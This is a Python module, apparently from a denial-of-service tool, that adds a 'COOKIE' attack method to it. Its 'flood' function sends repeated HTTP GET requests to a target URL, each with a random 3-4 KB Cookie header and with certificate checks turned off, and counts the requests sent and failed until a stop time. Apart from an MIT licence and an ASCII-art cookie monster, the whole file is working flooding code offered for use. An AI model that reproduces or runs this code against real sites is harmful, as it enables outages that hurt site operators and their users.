'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

#                .---. .---.
#               :     : o   :    me want cookie!
#           _..-:   o :     :-.._    /
#       .-''  '  `---' `---' "   ``-.
#     .'   "   '  "  .    "  . '  "  `.
#    :   '.---.,,.,...,.,.,.,..---.  ' ;
#    `. " `.                     .' " .'
#     `.  '`.                   .' ' .'
#      `.    `-._           _.-' "  .'  .----.
#        `. "    '"--...--"'  . ' .'  .'  o   `.
#        .'`-._'    " .     " _.-'`. :       o  :
#  jgs .'      ```--.....--'''    ' `:_ o       :
#    .'    "     '         "     "   ; `.;";";";'
#   ;         '       "       '     . ; .' ; ; ;
#  ;     '         '       '   "    .'      .-'
#  '  "     "   '      "           "    _.-'

import time, requests
from src.core import Core
from src.utils import *
from src.useragent import *
from random import randint

def flood(attack_id, url, stoptime) -> None:
    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        try:

            headers = utils().buildheaders(url)
            headers['Cookie'] = utils().randstr(randint(3072, 4096), chars='QWERTYUIOPASDFGHJKLZXCVBNM01234567890')

            Core.session.get(
                utils().buildblock(url),
                headers=headers,
                verify=False, 
                timeout=(5,1), 
                allow_redirects=False,
                stream=False,
                cert=None,
            )

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception as e:
            print(e)
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'COOKIE': {
        'info': 'HTTP GET flood with large cookies, tasty!',
        'func': flood
    }
})